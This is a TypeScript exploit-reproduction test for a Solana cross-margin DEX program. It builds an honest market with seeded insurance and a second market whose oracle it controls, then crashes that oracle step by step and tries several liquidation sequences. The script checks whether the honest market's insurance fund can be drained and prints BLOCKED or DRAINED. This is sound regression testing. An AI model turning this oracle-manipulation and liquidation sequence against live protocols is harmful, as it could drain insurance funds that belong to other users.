/** Round-2 exploit repro: a cross-margin portfolio with a leg on an HONEST market (seeded insurance)
 *  and a leg on an ATTACKER-oracle market. Crash the attacker market to blow up the shared portfolio;
 *  the honest market's insurance must NEVER be drawn (isolation). Prints BLOCKED (fixed) or DRAINED (bug). */
import { Connection, Keypair, PublicKey, SystemProgram, Transaction, TransactionInstruction, sendAndConfirmTransaction } from "@solana/web3.js";
import { createMint, createAccount, mintTo } from "@solana/spl-token";
import * as fs from "fs";
import {
  LEAN_DEVNET, DEX_SIZE, MARKET_SIZE, PORTFOLIO_SIZE, INS_RECEIPT_SIZE, POS_SCALE, TRADE_MODE,
  initDex, createMarket, updateOracle, initPortfolio, depositCollateral, depositInsurance, trade, refreshLeg, liquidate, appendLegMarkets,
  deriveDexVault, parseDex, parseMarket, parsePortfolio, type MarketParams, type VaultAccounts,
} from "../src/lean/index.js";

const conn = new Connection(process.env.SOLANA_RPC_URL ?? "https://api.devnet.solana.com", "confirmed");
const P = new PublicKey(process.env.LEAN_PROG ?? LEAN_DEVNET.percolator.toBase58());
const funder = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(`${process.env.HOME}/.config/solana/id.json`, "utf8"))));
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));
async function send(ixs: TransactionInstruction[], s: Keypair[] = []) { for (let i = 0; ; i++) { try { return await sendAndConfirmTransaction(conn, new Transaction().add(...ixs), [funder, ...s], { commitment: "confirmed" }); } catch (e) { if (i < 6 && /429|Too Many|block height|timed out|not found/i.test(String(e))) { await sleep(1500 * (i + 1)); continue; } throw e; } } }
async function newAcc(o: PublicKey, sz: number) { const kp = Keypair.generate(); const lam = await conn.getMinimumBalanceForRentExemption(sz); await send([SystemProgram.createAccount({ fromPubkey: funder.publicKey, newAccountPubkey: kp.publicKey, lamports: lam, space: sz, programId: o })], [kp]); return kp.publicKey; }
const insOf = async (m: PublicKey) => parseMarket(Buffer.from((await conn.getAccountInfo(m))!.data)).insurance;
async function waitSlot() { const s = await conn.getSlot("confirmed"); while ((await conn.getSlot("confirmed")) <= s) await sleep(300); }
const P6 = (n: bigint) => Number(n) / 1e6;
const params = (init: bigint): MarketParams => ({ initPrice: init, exitWindow: 10n, maxStaleness: 9000n, warmupSlots: 0n, imBps: 1000n, mmBps: 600n, liqFeeBps: 50n, tradeFeeBps: 0n, maxMoveBps: 100n, maxInsDrawBps: 2500n, maxOi: 1_000_000n * POS_SCALE, minMm: 0n });

async function main() {
  const mint = await createMint(conn, funder, funder.publicKey, null, 6);
  const feeVault = await createAccount(conn, funder, mint, funder.publicKey, Keypair.generate());
  const fTok = await createAccount(conn, funder, mint, funder.publicKey, Keypair.generate());
  await mintTo(conn, funder, mint, fTok, funder, 100_000n * POS_SCALE);
  const dex = await newAcc(P, DEX_SIZE);
  await send([initDex(P, { dex, admin: funder.publicKey, mint, feeVault, decimals: 6, createFee: 0n })]);
  const V: VaultAccounts = { dex, mint, vault: deriveDexVault(P, dex)[0] };
  const oH = Keypair.generate(), oA = Keypair.generate(); // honest oracle auth, attacker oracle auth (both ours in the repro)
  const H = await newAcc(P, MARKET_SIZE), A = await newAcc(P, MARKET_SIZE);
  await send([createMarket(P, { dex, market: H, mint, oracleAuth: oH.publicKey, creator: funder.publicKey, creatorToken: fTok, feeVault, params: params(100n * POS_SCALE) })]);
  await send([createMarket(P, { dex, market: A, mint, oracleAuth: oA.publicKey, creator: funder.publicKey, creatorToken: fTok, feeVault, params: params(100n * POS_SCALE) })]);
  // seed the HONEST market's insurance = the "prize"
  const rIns = await newAcc(P, INS_RECEIPT_SIZE);
  await send([depositInsurance(P, V, { market: H, receipt: rIns, lp: funder.publicKey, sourceToken: fTok, amount: 50n * POS_SCALE })]);
  const ins0 = await insOf(H);
  console.log(`HONEST market H insurance (prize) seeded = $${P6(ins0)}`);

  // portfolios: attacker (cross-margin H-short + A-long), plus counterparties on each market
  const own = () => Keypair.generate();
  const oAtk = own(), oHon = own(), oCp = own();
  const pAtk = await newAcc(P, PORTFOLIO_SIZE), pHon = await newAcc(P, PORTFOLIO_SIZE), pCp = await newAcc(P, PORTFOLIO_SIZE);
  for (const [pf, o, amt] of [[pAtk, oAtk, 300n], [pHon, oHon, 300n], [pCp, oCp, 300n]] as const) {
    await send([initPortfolio(P, { dex, portfolio: pf, owner: o.publicKey })], [o]);
    await send([depositCollateral(P, V, { portfolio: pf, depositor: funder.publicKey, sourceToken: fTok, amount: amt * POS_SCALE })]);
  }
  // attacker opens: SHORT 8 on HONEST (vs pHon long 8), LONG 8 on ATTACKER market (vs pCp short 8)
  await send([trade(P, { dex, market: H, longPortfolio: pHon, longOwner: oHon.publicKey, shortPortfolio: pAtk, shortOwner: oAtk.publicKey, mode: TRADE_MODE.OPEN, qty: 8n * POS_SCALE })], [oHon, oAtk], false);
  // cross-leg freshness: pAtk already has an H-leg; refresh it in the same tx as opening the A-leg.
  // (8774e86 verifyLegMktFresh: the other open leg's Market H must also ride along as a trailing read-only account.)
  await send([refreshLeg(P, { dex, market: H, portfolio: pAtk }), appendLegMarkets(trade(P, { dex, market: A, longPortfolio: pAtk, longOwner: oAtk.publicKey, shortPortfolio: pCp, shortOwner: oCp.publicKey, mode: TRADE_MODE.OPEN, qty: 8n * POS_SCALE }), [H])], [oAtk, oCp], false);
  console.log(`attacker pAtk: SHORT 8 on H + LONG 8 on A (cross-margin, $300 capital)`);

  // CRASH the attacker market A (1%/step) to blow up pAtk's A-long; refresh/liquidate; watch H.insurance.
  let priceA = 100n * POS_SCALE, drained = false, liquidations = 0; const lastErr: Record<string, string> = {};
  for (let i = 0; i < 35; i++) {
    await waitSlot();
    priceA = priceA - priceA / 100n; // -1% (diff = floor(1%), exactly the on-chain maxAllowed; `price*99/100` rounds the diff UP and gets oracleClamp 104 from step 5 on)
    // a full 1% step needs dt >= 2 slots (dt == 1 is half-paced -> oracleClamp 104): retry instead of giving up, so the
    // crash really reaches the attacker's liquidation / bankruptcy zone.
    let pushed = false, pushErr = "";
    for (let t = 0; t < 4 && !pushed; t++) { try { await send([updateOracle(P, { market: A, oracleAuth: oA.publicKey, price: priceA })], [oA]); pushed = true; } catch (e) { pushErr = String(e).replace(/api-key=[^&\s"]+/g, "api-key=***").replace(/\s+/g, " ").slice(0, 200); await waitSlot(); await waitSlot(); } }
    if (!pushed) { console.log(`   oracle push to $${P6(priceA)} rejected: ${pushErr}`); break; }
    await send([refreshLeg(P, { dex, market: A, portfolio: pAtk })]).catch(() => {});
    await send([refreshLeg(P, { dex, market: H, portfolio: pAtk })]).catch(() => {});
    // try to liquidate the now-underwater attacker on BOTH markets (whichever the attack would use)
    // Three shapes per market: bare; same-slot RefreshLeg of the OTHER leg + its Market trailing (what a real
    // liquidator sends for a multi-leg victim); and the bankrupt-probe (RefreshLeg flag 2) of the other leg.
    for (const mk of [A, H]) {
      const other = mk.equals(A) ? H : A;
      const liq = appendLegMarkets(liquidate(P, V, { market: mk, portfolio: pAtk, liquidatorToken: fTok }), [other]);
      const probe = refreshLeg(P, { dex, market: other, portfolio: pAtk }); probe.data = Buffer.from([probe.data[0], 2]);
      for (const ixs of [[liquidate(P, V, { market: mk, portfolio: pAtk, liquidatorToken: fTok })], [refreshLeg(P, { dex, market: other, portfolio: pAtk }), liq], [probe, liq]]) {
        try {
          const tx = new Transaction().add(...ixs);
          tx.feePayer = funder.publicKey; tx.recentBlockhash = (await conn.getLatestBlockhash("confirmed")).blockhash; tx.sign(funder);
          const sr = (await conn.simulateTransaction(tx)).value;
          if (!sr.err) { await send(ixs); liquidations++; break; }
          lastErr[`${mk.equals(A) ? "A" : "H"}/${ixs.length}${ixs.length > 1 && ixs[0].data[1] === 2 ? "p" : ""}`] = JSON.stringify(sr.err);
        } catch { /* */ }
      }
    }
    const insNow = await insOf(H);
    if (insNow < ins0) { console.log(`   STEP ${i}: H.insurance $${P6(ins0)} -> $${P6(insNow)} at A=$${P6(priceA)}`); drained = true; break; }
  }

  const insF = await insOf(H);
  const d = parseDex(Buffer.from((await conn.getAccountInfo(dex))!.data));
  const spl = BigInt((await conn.getTokenAccountBalance(V.vault)).value.amount);
  const cons = d.vaultBalance === spl && d.vaultBalance === d.totalCapital + d.totalInsurance + d.totalResidual + d.totalSurplus + d.totalRewards;
  console.log(`liquidations executed on the attacker: ${liquidations} (A ended at $${P6(priceA)}; last rejected attempts: ${JSON.stringify(lastErr)})`);
  { const pa = parsePortfolio(Buffer.from((await conn.getAccountInfo(pAtk))!.data)); console.log(`attacker end: capital $${P6(pa.capital)} locked $${P6(pa.totalLockedMm)} legs ${pa.legs.map((l) => `${l.sideName} ${l.rawBasis} pnl ${l.posPnl}`).join(", ")}`); }
  console.log(`\nHONEST insurance: start $${P6(ins0)} -> end $${P6(insF)} | conservation V==SPL==C+I+R+S+Rew: ${cons}`);
  if (drained || insF < ins0) { console.log("DRAINED ❌ — honest market insurance was reduced by a cross-margin loss on the attacker's market. BUG PRESENT."); process.exit(2); }
  console.log("BLOCKED ✅ — honest market's insurance untouched through the cross-margin attack (isolation holds). Fixed.");
  process.exit(0);
}
main().catch(e => { console.error(String(e).slice(0, 400)); process.exit(1); });
